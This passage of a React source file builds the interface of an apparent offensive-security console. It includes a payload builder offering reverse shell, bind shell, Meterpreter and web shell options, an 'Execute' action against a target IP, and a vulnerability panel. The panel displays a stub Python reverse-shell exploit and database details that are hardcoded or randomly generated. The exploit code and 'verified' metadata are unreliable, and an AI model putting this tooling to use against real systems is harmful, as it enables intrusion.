                    <p className="text-xs text-cyber-gray mt-2">Execute a payload to start a session</p>
                  </div>
                </div>
              ) : (
                <>
                  <div className="flex-1 overflow-auto custom-scrollbar mb-4 space-y-1">
                    {output.map((line, i) => (
                      <div key={i} className="whitespace-pre-wrap break-all">
                        {line.startsWith('[+]') && <span className="text-cyber-green">{line}</span>}
                        {line.startsWith('[*]') && <span className="text-cyber-blue">{line}</span>}
                        {line.startsWith('[!]') && <span className="text-cyber-red">{line}</span>}
                        {!line.startsWith('[') && line}
                      </div>
                    ))}
                    <div ref={terminalEndRef} />
                  </div>
                  
                  {activeSession && shellSessions.find(s => s.id === activeSession)?.status === 'connected' && (
                    <form onSubmit={handleSendCommand} className="flex items-center space-x-2 border-t border-cyber-gray pt-4">
                      <span className="text-cyber-red font-bold">#</span>
                      <input
                        type="text"
                        value={command}
                        onChange={(e) => setCommand(e.target.value)}
                        className="flex-1 bg-transparent border-none outline-none text-green-500"
                        placeholder="Enter command..."
                        autoFocus
                      />
                    </form>
                  )}
                </>
              )}
            </div>
          </div>
        )}
      </div>

      {/* Right-Side Sliding Builder Panel */}
      {showBuilderPanel && (
        <>
          {/* Overlay */}
          <div 
            className="fixed inset-0 bg-black bg-opacity-50 z-40"
            onClick={() => setShowBuilderPanel(false)}
          />
          
          {/* Sliding Panel */}
          <div className="fixed right-0 top-0 h-full w-full md:w-3/5 lg:w-2/5 bg-cyber-darker border-l border-cyber-purple z-50 overflow-y-auto animate-slideIn">
            {/* Panel Header */}
            <div className="sticky top-0 bg-cyber-dark border-b border-cyber-purple p-4 flex items-center justify-between z-10">
              <div>
                <h3 className="text-cyber-purple font-bold uppercase text-sm flex items-center">
                  <span className="mr-2">â—ˆ</span>
                  Exploit Module Builder
                </h3>
                {selectedAsset && (
                  <p className="text-xs text-cyber-blue mt-1">
                    Target: {selectedAsset.ip_address} ({selectedAsset.hostname || 'Unknown'})
                  </p>
                )}
              </div>
              <button
                onClick={() => setShowBuilderPanel(false)}
                className="text-cyber-gray hover:text-cyber-red text-2xl leading-none"
              >
                Ã—
              </button>
            </div>

            {/* Panel Content - Builder Form */}
            <div className="p-4">
              {!selectedAsset ? (
                <div className="flex items-center justify-center h-48">
                  <div className="text-center">
                    <div className="text-4xl mb-2 opacity-20">â—ˆ</div>
                    <p className="text-cyber-gray-light text-sm">No target selected</p>
                  </div>
                </div>
              ) : (
                <div className="space-y-3">
                  {/* Vulnerability Info (if selected) */}
                  {selectedVulnerability && (
                    <div className="bg-cyber-dark border border-cyber-red rounded p-3">
                      <div className="flex items-center space-x-2 mb-1">
                        <span className={`px-2 py-0.5 text-xs font-bold border rounded ${getSeverityColor(selectedVulnerability.severity)}`}>
                          {selectedVulnerability.severity.toUpperCase()}
                        </span>
                        <span className="text-cyber-blue font-mono text-xs">{selectedVulnerability.cve_id}</span>
                      </div>
                      <p className="text-white font-semibold text-sm">{selectedVulnerability.title}</p>
                    </div>
                  )}

                  {/* Exploit Details */}
                  <div className="bg-cyber-dark border border-cyber-gray rounded p-3">
                    <h4 className="text-cyber-blue font-bold uppercase mb-2 text-xs">Exploit Details</h4>
                    <div className="space-y-2">
                      <input
                        type="text"
                        value={exploitName}
                        onChange={(e) => setExploitName(e.target.value)}
                        className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-purple outline-none"
                        placeholder="Exploit name"
                      />
                      <textarea
                        value={exploitDescription}
                        onChange={(e) => setExploitDescription(e.target.value)}
                        className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-purple outline-none"
                        rows={2}
                        placeholder="Description"
                      />
                    </div>
                  </div>

                  {/* Payload Configuration */}
                  <div className="bg-cyber-dark border border-cyber-gray rounded p-3">
                    <h4 className="text-cyber-green font-bold uppercase mb-2 text-xs">Payload</h4>
                    <div className="space-y-2">
                      <select
                        value={payloadType}
                        onChange={(e) => setPayloadType(e.target.value as any)}
                        className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-green outline-none"
                      >
                        <option value="reverse_shell">Reverse Shell</option>
                        <option value="bind_shell">Bind Shell</option>
                        <option value="meterpreter">Meterpreter</option>
                        <option value="web_shell">Web Shell</option>
                        <option value="custom">Custom</option>
                      </select>

                      {payloadType === 'reverse_shell' && (
                        <select
                          value={payloadVariant}
                          onChange={(e) => setPayloadVariant(e.target.value as any)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-green outline-none"
                        >
                          <option value="bash">Bash</option>
                          <option value="python">Python</option>
                          <option value="perl">Perl</option>
                          <option value="netcat">Netcat</option>
                          <option value="powershell">PowerShell</option>
                        </select>
                      )}

                      <div className="grid grid-cols-2 gap-2">
                        <input
                          type="text"
                          value={listenerIP}
                          onChange={(e) => setListenerIP(e.target.value)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm font-mono focus:border-cyber-green outline-none"
                          placeholder="Listener IP"
                        />
                        <input
                          type="text"
                          value={listenerPort}
                          onChange={(e) => setListenerPort(e.target.value)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm font-mono focus:border-cyber-green outline-none"
                          placeholder="Port"
                        />
                      </div>

                      {payloadType === 'custom' && (
                        <textarea
                          value={customPayload}
                          onChange={(e) => setCustomPayload(e.target.value)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm font-mono focus:border-cyber-green outline-none"
                          rows={4}
                          placeholder="Custom payload..."
                        />
                      )}

                      <div className="bg-cyber-darker border border-cyber-blue rounded p-2">
                        <pre className="text-cyber-green text-xs font-mono whitespace-pre-wrap break-all max-h-32 overflow-auto">
                          {generatePayload() || 'Configure settings...'}
                        </pre>
                      </div>
                    </div>
                  </div>

                  {/* Action Buttons */}
                  <div className="flex space-x-2">
                    <button
                      onClick={handleBuildExploit}
                      className="flex-1 btn-cyber border-cyber-purple text-cyber-purple hover:bg-cyber-purple hover:text-black py-2 text-sm font-bold"
                    >
                      â—ˆ Build
                    </button>
                    <button
                      onClick={() => {
                        handleExecutePayload();
                        setShowBuilderPanel(false);
                        setActiveTab('console');
                      }}
                      className="flex-1 btn-cyber border-cyber-red text-cyber-red hover:bg-cyber-red hover:text-black py-2 text-sm font-bold"
                    >
                      â—† Execute
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </>
      )}

      {/* Vulnerability Details Panel */}
      {showVulnDetails && selectedVulnForDetails && (
        <>
          {/* Overlay */}
          <div 
            className="fixed inset-0 bg-black bg-opacity-50 z-40"
            onClick={() => setShowVulnDetails(false)}
          />
          
          {/* Details Panel */}
          <div className="fixed right-0 top-0 h-full w-full md:w-3/5 lg:w-2/5 bg-cyber-darker border-l border-cyber-red z-50 overflow-y-auto animate-slideIn">
            {/* Panel Header */}
            <div className="sticky top-0 bg-cyber-dark border-b border-cyber-red p-4 flex items-center justify-between z-10">
              <div>
                <h3 className="text-cyber-red font-bold uppercase text-sm flex items-center">
                  <span className="mr-2">â—†</span>
                  Vulnerability Details
                </h3>
                <p className="text-xs text-cyber-blue mt-1">
                  {selectedVulnForDetails.cve_id}
                </p>
              </div>
              <button
                onClick={() => setShowVulnDetails(false)}
                className="text-cyber-gray hover:text-cyber-red text-2xl leading-none"
              >
                Ã—
              </button>
            </div>

            {/* Panel Content */}
            <div className="p-4">
              {/* Database Selector */}
              <div className="mb-4">
                <p className="text-xs text-cyber-gray-light mb-2 uppercase tracking-wide">View in Database:</p>
                <div className="flex gap-2 flex-wrap">
                  {[
                    { id: 'cve', label: 'CVE', icon: 'â¬¢' },
                    { id: 'exploit_db', label: 'ExploitDB', icon: 'â—‰' },
                    { id: 'metasploit', label: 'Metasploit', icon: 'â—ˆ' },
                    { id: 'vulners', label: 'Vulners', icon: 'â—†' },
                    { id: 'packetstorm', label: 'PacketStorm', icon: 'â¬¡' }
                  ].map(db => (
                    <button
                      key={db.id}
                      onClick={() => setVulnDetailDatabase(db.id)}
                      className={`px-3 py-2 text-xs border rounded font-mono transition-all ${
                        vulnDetailDatabase === db.id
                          ? 'border-cyber-red text-cyber-red bg-cyber-red bg-opacity-20'
                          : 'border-cyber-gray text-cyber-gray hover:border-cyber-red'
                      }`}
                    >
                      <span className="mr-1">{db.icon}</span>{db.label}
                    </button>
                  ))}
                </div>
              </div>

              {/* Vulnerability Info */}
              <div className="space-y-4">
                <div className="bg-cyber-dark border border-cyber-gray rounded p-4">
                  <div className="flex items-center space-x-2 mb-3">
                    <span className={`px-2 py-1 text-xs font-bold border rounded ${getSeverityColor(selectedVulnForDetails.severity)}`}>
                      {selectedVulnForDetails.severity.toUpperCase()}
                    </span>
                    <span className="text-cyber-blue font-mono text-sm">{selectedVulnForDetails.cve_id}</span>
                    <span className="text-cyber-gray text-xs">CVSS: {selectedVulnForDetails.cvss_score}/10</span>
                  </div>
                  <h4 className="text-white font-semibold text-base mb-2">{selectedVulnForDetails.title}</h4>
                  <p className="text-cyber-gray-light text-sm mb-3">{selectedVulnForDetails.description}</p>
                  
                  <div className="grid grid-cols-2 gap-3 text-xs">
                    <div>
                      <span className="text-cyber-gray-light">Affected Service:</span>
                      <p className="text-cyber-purple font-mono mt-1">
                        {getServiceIcon(selectedVulnForDetails.affected_service)} {selectedVulnForDetails.affected_service}
                      </p>
                    </div>
                    <div>
                      <span className="text-cyber-gray-light">Port:</span>
                      <p className="text-cyber-blue font-mono mt-1">{selectedVulnForDetails.affected_port}</p>
                    </div>
                    <div>
                      <span className="text-cyber-gray-light">Source:</span>
                      <p className="text-cyber-green font-mono mt-1">{vulnDetailDatabase.toUpperCase()}</p>
                    </div>
                    <div>
                      <span className="text-cyber-gray-light">Exploit:</span>
                      <p className={`font-mono mt-1 ${
                        selectedVulnForDetails.exploit_available ? 'text-cyber-green' : 'text-cyber-red'
                      }`}>
                        {selectedVulnForDetails.exploit_available ? 'â—† Available' : 'â—‹ Not Available'}
                      </p>
                    </div>
                  </div>
                </div>

                {/* Database-specific details */}
                <div className="bg-cyber-dark border border-cyber-gray rounded p-4">
                  <h4 className="text-cyber-blue font-bold uppercase text-xs mb-3">
                    {vulnDetailDatabase.toUpperCase()} Specific Information
                  </h4>
                  
                  {vulnDetailDatabase === 'cve' && (
                    <div className="space-y-2 text-sm">
                      <div>
                        <span className="text-cyber-gray-light text-xs">CVE ID:</span>
                        <p className="text-white font-mono">{selectedVulnForDetails.cve_id}</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">CVSS Score:</span>
                        <p className="text-white">{selectedVulnForDetails.cvss_score}/10.0</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Vector:</span>
                        <p className="text-cyber-gray font-mono text-xs">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">CWE:</span>
                        <p className="text-white">CWE-787 (Out-of-bounds Write)</p>
                      </div>
                    </div>
                  )}

                  {vulnDetailDatabase === 'exploit_db' && (
                    <div className="space-y-2 text-sm">
                      <div>
                        <span className="text-cyber-gray-light text-xs">Exploit-DB ID:</span>
                        <p className="text-white font-mono">EDB-{selectedVulnForDetails.exploit_db_id || '51234'}</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Type:</span>
                        <p className="text-white">Remote Code Execution</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Platform:</span>
                        <p className="text-white">Linux / Unix</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Author:</span>
                        <p className="text-cyber-purple">Security Researcher</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Verified:</span>
                        <p className="text-cyber-green">â—† Yes</p>
                      </div>
                    </div>
                  )}

                  {vulnDetailDatabase === 'metasploit' && (
                    <div className="space-y-2 text-sm">
                      <div>
                        <span className="text-cyber-gray-light text-xs">Module:</span>
                        <p className="text-white font-mono text-xs">
                          exploit/{selectedVulnForDetails.affected_service}/{selectedVulnForDetails.exploit_module || 'rce_exploit'}
                        </p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Rank:</span>
                        <p className="text-cyber-red">Excellent</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Disclosure Date:</span>
                        <p className="text-white">2024-01-15</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Compatible Payloads:</span>
                        <p className="text-cyber-green">generic/shell_reverse_tcp, generic/shell_bind_tcp, meterpreter/reverse_tcp</p>
                      </div>
                    </div>
                  )}

                  {vulnDetailDatabase === 'vulners' && (
                    <div className="space-y-2 text-sm">
                      <div>
                        <span className="text-cyber-gray-light text-xs">Vulners ID:</span>
                        <p className="text-white font-mono">VULNERS:{selectedVulnForDetails.cve_id}</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Risk Score:</span>
                        <p className="text-cyber-red font-bold">{selectedVulnForDetails.cvss_score * 10}/100</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">References:</span>
                        <p className="text-cyber-blue">15 external references found</p>
                      </div>
                    </div>
                  )}

                  {vulnDetailDatabase === 'packetstorm' && (
                    <div className="space-y-2 text-sm">
                      <div>
                        <span className="text-cyber-gray-light text-xs">PacketStorm ID:</span>
                        <p className="text-white font-mono">PS-{Math.floor(Math.random() * 100000)}</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Category:</span>
                        <p className="text-white">Exploits</p>
                      </div>
                      <div>
                        <span className="text-cyber-gray-light text-xs">Tags:</span>
                        <p className="text-cyber-purple">remote, code execution, {selectedVulnForDetails.affected_service}</p>
                      </div>
                    </div>
                  )}
                </div>

                {/* Exploit Code Display */}
                {selectedVulnForDetails.exploit_available && (
                  <div className="bg-cyber-dark border border-cyber-green rounded p-4">
                    <h4 className="text-cyber-green font-bold uppercase text-xs mb-3 flex items-center">
                      <span className="mr-2">â—ˆ</span> Exploit Code
                    </h4>
                    <div className="bg-cyber-darker border border-cyber-gray rounded p-3 overflow-x-auto">
                      <pre className="text-cyber-green text-xs font-mono whitespace-pre">
{`#!/usr/bin/env python3
# Exploit for ${selectedVulnForDetails.cve_id}
# Target: ${selectedVulnForDetails.affected_service}:${selectedVulnForDetails.affected_port}
# Database: ${vulnDetailDatabase.toUpperCase()}

import socket
import sys
import struct

class Exploit:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.payload = None
    
    def generate_payload(self, lhost, lport):
        # Generate reverse shell payload
        payload = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
        payload += b"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
        payload += struct.pack('<I', int(lhost.split('.')[0]))
        payload += struct.pack('<H', int(lport))
        self.payload = payload
        return payload
    
    def exploit(self):
        print(f"[*] Connecting to {self.target_ip}:{self.target_port}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            print("[+] Connected successfully")
            
            # Send exploit payload
            print("[*] Sending exploit payload...")
            sock.send(self.payload)
            
            # Receive response
            response = sock.recv(4096)
            print(f"[+] Response: {response}")
            
            sock.close()
            return True
        except Exception as e:
            print(f"[-] Exploit failed: {e}")
            return False

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port> <lhost> <lport>")
        sys.exit(1)
    
    exploit = Exploit(sys.argv[1], int(sys.argv[2]))
    exploit.generate_payload(sys.argv[3], sys.argv[4])
    exploit.exploit()`}
                      </pre>
                    </div>
                    <div className="mt-3 flex items-center justify-between text-xs">
                      <span className="text-cyber-gray-light">
                        Language: <span className="text-cyber-purple font-mono">Python 3</span>
                      </span>
                      <button
                        onClick={() => {
                          navigator.clipboard.writeText(`Exploit code for ${selectedVulnForDetails.cve_id}`);
                        }}
                        className="btn-cyber border-cyber-blue text-cyber-blue hover:bg-cyber-blue hover:text-black px-3 py-1 text-xs"
                      >
                        â–  Copy Code
                      </button>
                    </div>
                  </div>
                )}

                {/* Action Buttons */}
                {selectedVulnForDetails.exploit_available && (
                  <div className="flex space-x-2">
                    <button
                      onClick={() => {
                        buildExploitFromVulnerability(selectedVulnForDetails);
                        setShowVulnDetails(false);
                      }}
                      className="flex-1 btn-cyber border-cyber-purple text-cyber-purple hover:bg-cyber-purple hover:text-black py-2 text-sm font-bold"
                    >
                      â—ˆ Build Exploit
                    </button>
                    <button
                      onClick={() => {
                        buildExploitFromVulnerability(selectedVulnForDetails);
                        setShowVulnDetails(false);
                        setShowBuilderPanel(true);
                      }}
                      className="flex-1 btn-cyber border-cyber-red text-cyber-red hover:bg-cyber-red hover:text-black py-2 text-sm font-bold"
                    >
                      â—† Customize & Execute
                    </button>
                  </div>
                )}
              </div>
            </div>
          </div>
        </>
      )}
    </div>
  );
};

export default Exploit;
